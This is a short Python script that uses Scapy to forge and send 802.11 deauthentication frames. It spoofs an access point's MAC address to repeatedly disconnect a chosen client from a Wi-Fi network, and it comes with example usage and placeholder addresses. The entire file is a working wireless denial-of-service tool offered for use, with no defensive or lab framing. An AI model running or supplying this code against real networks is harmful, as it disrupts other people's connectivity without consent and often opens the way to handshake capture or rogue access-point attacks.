from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def send_deauth(target_mac, ap_mac, iface, count=100, interval=0.1):
    """
    Send 802.11 Deauthentication frames to disconnect a client from an AP.

    Parameters:
    - target_mac: MAC address of the client to disconnect.
    - ap_mac: MAC address of the legitimate Access Point.
    - iface: Interface in monitor mode to send the packets.
    - count: Number of packets to send (default 100).
    - interval: Delay between packets in seconds (default 0.1).
    """
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    print(f"[!] Sending deauth packets to {target_mac} from {ap_mac} on interface {iface}...")
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=1)

# Example usage
if __name__ == "__main__":
    # Set your target MACs and interface here
    target_mac = "AA:BB:CC:DD:EE:FF"
    ap_mac = "11:22:33:44:55:66"
    iface = "wlp2s0"

    send_deauth(target_mac, ap_mac, iface)
